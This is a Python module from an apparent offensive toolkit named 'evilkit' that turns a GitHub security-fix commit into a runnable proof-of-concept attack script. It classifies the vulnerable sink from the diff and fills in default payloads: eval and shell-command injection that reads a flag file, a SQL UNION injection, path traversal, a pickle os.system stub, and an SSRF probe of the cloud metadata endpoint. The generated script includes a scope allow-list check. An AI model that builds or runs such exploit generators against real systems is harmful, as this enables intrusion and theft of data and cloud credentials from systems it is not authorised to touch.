"""Turn a security-fix commit on GitHub into a scope-gated PoC request script.

Pipeline:

    commit URL  --->  fetched diff  --->  PocRecipe  --->  rendered Python script

The recipe is a dataclass of plain facts pulled from the unified diff:
affected files, removed/added lines, which parameter names flow into a sink,
and a sink class ("eval-sink", "template-injection", "sqli-union", ...). The
renderer is a template library keyed on the sink class — unknown classes still
emit a harness, but with a `# TODO: payload` placeholder.

Every generated script does three things before it fires:

* parses --target <base-url>, splits off scheme/host/port,
* reads an allow-list file (same shape as `evilkit scope show`) and refuses
  to run if the target host is not listed,
* captures the response and writes a small JSON evidence record next to the
  script so the operator has a wire-level artifact for the engagement journal.

Nothing in this module reaches out beyond the GitHub commit URL (and only the
GitHub API; it never fetches third-party content). The generated script itself
does the (operator-authorised) target request.
"""

from __future__ import annotations

import dataclasses
import json
import os
import re
import textwrap
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Iterable

__all__ = [
    "PatchDiffError",
    "CommitRef",
    "PocRecipe",
    "parse_commit_url",
    "fetch_commit",
    "fetch_diff",
    "classify_sink",
    "extract_params",
    "build_recipe",
    "render_script",
    "SINK_CLASSES",
]

STAGE_VERSION = 1

_GITHUB_API = "https://api.github.com"
_COMMIT_URL_RE = re.compile(
    r"^https?://github\.com/(?P<owner>[^/\s]+)/(?P<repo>[^/\s]+)/commit/(?P<sha>[0-9a-fA-F]{7,64})/?$"
)
_SHORT_RE = re.compile(
    r"^(?P<owner>[^/@\s]+)/(?P<repo>[^/@\s]+)@(?P<sha>[0-9a-fA-F]{7,64})$"
)


class PatchDiffError(Exception):
    """Anything the module cannot recover from (bad URL, network, parse)."""


@dataclass(frozen=True)
class CommitRef:
    owner: str
    repo: str
    sha: str

    @property
    def slug(self) -> str:
        return f"{self.owner}/{self.repo}@{self.sha[:12]}"


#: Keyword signatures per sink class.  Order matters: the first class whose
#: keywords appear in the DIFF (either side) wins.  Keep patterns narrow — a
#: generic word like "input" or "data" belongs nowhere here.
SINK_CLASSES: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("eval-sink", (
        r"\bImageMath\.eval\b",
        r"\beval\s*\(",
        r"\bexec\s*\(",
    )),
    ("deserialization", (
        r"\bpickle\.loads?\b",
        r"\byaml\.load\b",
        r"\bmarshal\.loads?\b",
    )),
    ("template-injection", (
        r"\brender_template_string\b",
        r"\bTemplate\s*\(",
        r"\bjinja2\.Environment\b",
    )),
    ("cmd-injection", (
        r"\bos\.system\b",
        r"\bos\.popen\b",
        r"\bsubprocess\.(?:call|run|Popen|check_output)\s*\([^)]*shell\s*=\s*True",
    )),
    ("sqli-union", (
        r"\bexecute\s*\([^)]*['\"][^'\"]*['\"]\s*\+",
        r"\bexecute\s*\([^)]*\+\s*\w+\s*\+",
        r"\bexecute\s*\(\s*f?['\"][^'\"]*\{[^}]*\}[^'\"]*['\"]",
        r"\b(?:SELECT|INSERT|UPDATE|DELETE)\b[^'\"]*['\"]\s*\+\s*\w+",
    )),
    ("path-traversal", (
        r"\bos\.path\.join\s*\(",
        r"\bopen\s*\(",
        r"\.\./",
    )),
    ("ssrf", (
        r"\brequests\.(?:get|post|put|delete)\b",
        r"\burllib\.request\.urlopen\b",
    )),
)


_PARAM_PATTERNS = (
    re.compile(r"request\.args\.get\(\s*['\"](?P<name>[A-Za-z_][A-Za-z0-9_]*)['\"]"),
    re.compile(r"request\.form\.get\(\s*['\"](?P<name>[A-Za-z_][A-Za-z0-9_]*)['\"]"),
    re.compile(r"request\.json\.get\(\s*['\"](?P<name>[A-Za-z_][A-Za-z0-9_]*)['\"]"),
    re.compile(r"parse_qs\(.*\)\.get\(\s*['\"](?P<name>[A-Za-z_][A-Za-z0-9_]*)['\"]"),
    re.compile(r"self\.get_argument\(\s*['\"](?P<name>[A-Za-z_][A-Za-z0-9_]*)['\"]"),
)

_PATH_PATTERNS = (
    re.compile(r"@app\.route\(\s*['\"](?P<path>/[^'\"\s]*)['\"]"),
    re.compile(r"@router\.(?:get|post|put|delete)\(\s*['\"](?P<path>/[^'\"\s]*)['\"]"),
    re.compile(r"parsed\.path\s*==\s*['\"](?P<path>/[^'\"\s]*)['\"]"),
)

_CVE_RE = re.compile(r"\bCVE-\d{4}-\d{4,7}\b", re.IGNORECASE)


@dataclass
class PocRecipe:
    commit: CommitRef
    cve_id: str | None
    title: str | None
    sink_class: str
    affected_files: list[str] = field(default_factory=list)
    params: list[str] = field(default_factory=list)
    endpoint_hints: list[str] = field(default_factory=list)
    removed_lines: list[str] = field(default_factory=list)
    added_lines: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        d = dataclasses.asdict(self)
        d["commit"] = {"owner": self.commit.owner, "repo": self.commit.repo, "sha": self.commit.sha}
        return d


def parse_commit_url(raw: str) -> CommitRef:
    """Accept the full github.com/.../commit/<sha> URL or an owner/repo@sha short form."""
    raw = raw.strip()
    m = _COMMIT_URL_RE.match(raw) or _SHORT_RE.match(raw)
    if not m:
        raise PatchDiffError(
            f"not a commit reference: {raw!r} "
            "(expected https://github.com/<owner>/<repo>/commit/<sha> or <owner>/<repo>@<sha>)"
        )
    return CommitRef(owner=m.group("owner"), repo=m.group("repo"), sha=m.group("sha"))


def _api(url: str, *, accept: str, token: str | None, timeout: float) -> bytes:
    req = urllib.request.Request(url, headers={
        "Accept": accept,
        "User-Agent": "evilkit-patch-diff-poc/1",
    })
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        detail = exc.read().decode("utf-8", "replace")[:200]
        raise PatchDiffError(f"GitHub API {exc.code} on {url}: {detail}") from exc
    except urllib.error.URLError as exc:
        raise PatchDiffError(f"could not reach GitHub ({exc.reason})") from exc


def fetch_commit(commit: CommitRef, *, token: str | None = None, timeout: float = 20.0) -> dict:
    body = _api(
        f"{_GITHUB_API}/repos/{commit.owner}/{commit.repo}/commits/{commit.sha}",
        accept="application/vnd.github+json",
        token=token,
        timeout=timeout,
    )
    try:
        return json.loads(body)
    except json.JSONDecodeError as exc:
        raise PatchDiffError(f"GitHub returned non-JSON for commit {commit.slug}") from exc


def fetch_diff(commit: CommitRef, *, token: str | None = None, timeout: float = 20.0) -> str:
    body = _api(
        f"{_GITHUB_API}/repos/{commit.owner}/{commit.repo}/commits/{commit.sha}",
        accept="application/vnd.github.v3.diff",
        token=token,
        timeout=timeout,
    )
    return body.decode("utf-8", "replace")


def _split_hunks(diff: str) -> tuple[list[str], list[str], list[str]]:
    """Return (file paths, removed lines, added lines) from a unified diff."""
    files: list[str] = []
    removed: list[str] = []
    added: list[str] = []
    for line in diff.splitlines():
        if line.startswith("+++ b/"):
            files.append(line[6:])
        elif line.startswith("-") and not line.startswith("---"):
            removed.append(line[1:])
        elif line.startswith("+") and not line.startswith("+++"):
            added.append(line[1:])
    return files, removed, added


def classify_sink(diff: str) -> str:
    """Pick the first sink class whose patterns match the diff (any side)."""
    for name, patterns in SINK_CLASSES:
        for pat in patterns:
            if re.search(pat, diff, flags=re.MULTILINE):
                return name
    return "unknown"


def extract_params(lines: Iterable[str]) -> list[str]:
    """Pull HTTP parameter names referenced in the given lines."""
    found: list[str] = []
    seen: set[str] = set()
    for line in lines:
        for pat in _PARAM_PATTERNS:
            m = pat.search(line)
            if m:
                name = m.group("name")
                if name not in seen:
                    seen.add(name)
                    found.append(name)
    return found


def _extract_endpoints(lines: Iterable[str]) -> list[str]:
    found: list[str] = []
    seen: set[str] = set()
    for line in lines:
        for pat in _PATH_PATTERNS:
            m = pat.search(line)
            if m:
                path = m.group("path")
                if path not in seen:
                    seen.add(path)
                    found.append(path)
    return found


def build_recipe(commit: CommitRef, meta: dict, diff: str) -> PocRecipe:
    files, removed, added = _split_hunks(diff)
    sink = classify_sink(diff)
    msg = (meta.get("commit") or {}).get("message") or ""
    title = msg.splitlines()[0] if msg else None
    cve = (_CVE_RE.search(msg) or _CVE_RE.search(diff))
    all_source_lines = [*removed, *added]
    return PocRecipe(
        commit=commit,
        cve_id=cve.group(0).upper() if cve else None,
        title=title,
        sink_class=sink,
        affected_files=files,
        params=extract_params(all_source_lines),
        endpoint_hints=_extract_endpoints(all_source_lines),
        removed_lines=removed[:40],
        added_lines=added[:40],
    )


# -- script rendering ----------------------------------------------------------

_PAYLOAD_BY_CLASS: dict[str, str] = {
    "eval-sink": r'__import__("os").popen("cat {flag_path}").read()',
    "cmd-injection": "; cat {flag_path}",
    "template-injection": "{{ 7*7 }}",
    "sqli-union": "' UNION SELECT NULL,flag FROM flags--",
    "path-traversal": "../../{flag_path}",
    "deserialization": "<base64-pickle-of-cos.system('id')>",
    "ssrf": "http://169.254.169.254/latest/meta-data/",
    "unknown": "<TODO: payload for this sink class>",
}


_SCRIPT_TEMPLATE = r'''#!/usr/bin/env python3
"""Scope-gated PoC generated by evilkit patch-diff-poc.

Commit : {commit_slug}
CVE    : {cve_id}
Sink   : {sink_class}
Params : {params_display}
Paths  : {endpoints_display}

Do NOT fire this at anything you are not explicitly authorised to test. The
script reads a scope allow-list (--scope-file) and refuses to run against a
host that is not listed.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import os
import re
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

RECIPE = json.loads({recipe_json_literal!r})

DEFAULT_PAYLOAD = {default_payload!r}
DEFAULT_PARAM = {default_param!r}
DEFAULT_ENDPOINT = {default_endpoint!r}


def load_scope(path: str) -> list[str]:
    entries: list[str] = []
    with open(path, "r", encoding="utf-8") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            entries.extend(part.strip() for part in line.split(",") if part.strip())
    return entries


def host_in_scope(host: str, scope: list[str]) -> bool:
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        try:
            ip = ipaddress.ip_address(socket.gethostbyname(host))
        except (OSError, ValueError):
            ip = None
    for entry in scope:
        if entry == host:
            return True
        if "/" in entry:
            try:
                net = ipaddress.ip_network(entry, strict=False)
            except ValueError:
                continue
            if ip is not None and ip in net:
                return True
        else:
            try:
                net_ip = ipaddress.ip_address(entry)
            except ValueError:
                continue
            if ip is not None and ip == net_ip:
                return True
    return False


def main() -> int:
    p = argparse.ArgumentParser(description="PoC for " + (RECIPE.get("cve_id") or RECIPE["commit"]["sha"][:12]))
    p.add_argument("--target", required=True, help="base URL, e.g. http://10.99.50.114:8082")
    p.add_argument("--scope-file", required=True, help="newline/comma allow-list of hosts/CIDRs")
    p.add_argument("--payload", default=DEFAULT_PAYLOAD, help="payload string (sink-class default used if omitted)")
    p.add_argument("--param", default=DEFAULT_PARAM, help="request parameter name")
    p.add_argument("--endpoint", default=DEFAULT_ENDPOINT, help="path to hit (default from recipe)")
    p.add_argument("--method", default="GET", choices=("GET", "POST"))
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--evidence", default=None, help="write a JSON evidence record to this path")
    args = p.parse_args()

    base = args.target.rstrip("/")
    parsed = urllib.parse.urlsplit(base if "://" in base else "http://" + base)
    host = parsed.hostname
    if not host:
        print("could not parse host from --target", file=sys.stderr)
        return 2

    try:
        scope = load_scope(args.scope_file)
    except OSError as exc:
        print(f"cannot read scope file: {{exc}}".format(exc=exc), file=sys.stderr)
        return 2
    if not host_in_scope(host, scope):
        print(f"REFUSED: {{host}} is not in the scope file {{args.scope_file}}".format(host=host, args=args), file=sys.stderr)
        return 3

    endpoint = args.endpoint or "/"
    if not endpoint.startswith("/"):
        endpoint = "/" + endpoint

    started = time.time()
    data = None
    if args.method == "GET":
        qs = urllib.parse.urlencode({{args.param: args.payload}})
        url = f"{{base}}{{endpoint}}?{{qs}}"
    else:
        url = f"{{base}}{{endpoint}}"
        data = urllib.parse.urlencode({{args.param: args.payload}}).encode()

    req = urllib.request.Request(url, data=data, method=args.method,
                                 headers={{"User-Agent": "evilkit-patch-diff-poc/1"}})
    status = None
    body = b""
    err = None
    try:
        with urllib.request.urlopen(req, timeout=args.timeout) as resp:
            status = resp.status
            body = resp.read(65536)
    except urllib.error.HTTPError as exc:
        status = exc.code
        body = exc.read()[:65536] if hasattr(exc, "read") else b""
    except (urllib.error.URLError, socket.timeout) as exc:
        err = str(exc)

    elapsed = time.time() - started
    body_text = body.decode("utf-8", "replace")[:4000]
    print(f"url    : {{url}}".format(url=url))
    print(f"status : {{status}}".format(status=status))
    print(f"time   : {{elapsed:.2f}}s".format(elapsed=elapsed))
    if err:
        print(f"error  : {{err}}".format(err=err))
    print("---")
    print(body_text)

    hit = status is not None and 200 <= status < 300 and bool(body_text.strip())
    if args.evidence:
        with open(args.evidence, "w", encoding="utf-8") as f:
            json.dump({{
                "cve_id": RECIPE.get("cve_id"),
                "commit": RECIPE["commit"],
                "sink_class": RECIPE["sink_class"],
                "target": base,
                "endpoint": endpoint,
                "param": args.param,
                "payload": args.payload,
                "method": args.method,
                "status": status,
                "elapsed_s": elapsed,
                "hit": hit,
                "error": err,
                "body_head": body_text[:1000],
            }}, f, indent=2)
    return 0 if hit else 1


if __name__ == "__main__":
    sys.exit(main())
'''


def render_script(recipe: PocRecipe, *, flag_path: str = "/opt/app/flag.txt") -> str:
    default_payload = _PAYLOAD_BY_CLASS.get(recipe.sink_class, _PAYLOAD_BY_CLASS["unknown"])
    default_payload = default_payload.format(flag_path=flag_path)
    default_param = recipe.params[0] if recipe.params else "q"
    default_endpoint = recipe.endpoint_hints[0] if recipe.endpoint_hints else ""
    params_display = ", ".join(recipe.params) if recipe.params else "(none detected)"
    endpoints_display = ", ".join(recipe.endpoint_hints) if recipe.endpoint_hints else "(none detected)"
    recipe_json_literal = json.dumps(recipe.to_dict())
    return _SCRIPT_TEMPLATE.format(
        commit_slug=recipe.commit.slug,
        cve_id=recipe.cve_id or "(unlabelled)",
        sink_class=recipe.sink_class,
        params_display=params_display,
        endpoints_display=endpoints_display,
        recipe_json_literal=recipe_json_literal,
        default_payload=default_payload,
        default_param=default_param,
        default_endpoint=default_endpoint,
    )


def github_token() -> str | None:
    """Honour the usual env knobs so a user with a token gets higher rate limits."""
    return os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")


def generate(
    commit_url: str,
    *,
    out_dir: Path | None = None,
    token: str | None = None,
    flag_path: str = "/opt/app/flag.txt",
    timeout: float = 20.0,
) -> tuple[PocRecipe, Path, Path]:
    """End-to-end: URL -> recipe -> script written next to a recipe JSON.

    Returns ``(recipe, recipe_path, script_path)``. ``out_dir`` defaults to the
    current working directory. Both outputs are overwritten if present.
    """
    commit = parse_commit_url(commit_url)
    meta = fetch_commit(commit, token=token, timeout=timeout)
    diff = fetch_diff(commit, token=token, timeout=timeout)
    recipe = build_recipe(commit, meta, diff)
    script = render_script(recipe, flag_path=flag_path)
    base = out_dir or Path.cwd()
    base.mkdir(parents=True, exist_ok=True)
    stem = f"poc_{commit.owner}_{commit.repo}_{commit.sha[:12]}"
    recipe_path = base / f"{stem}.recipe.json"
    script_path = base / f"{stem}.py"
    recipe_path.write_text(json.dumps(recipe.to_dict(), indent=2), encoding="utf-8")
    script_path.write_text(script, encoding="utf-8")
    script_path.chmod(0o755)
    return recipe, recipe_path, script_path
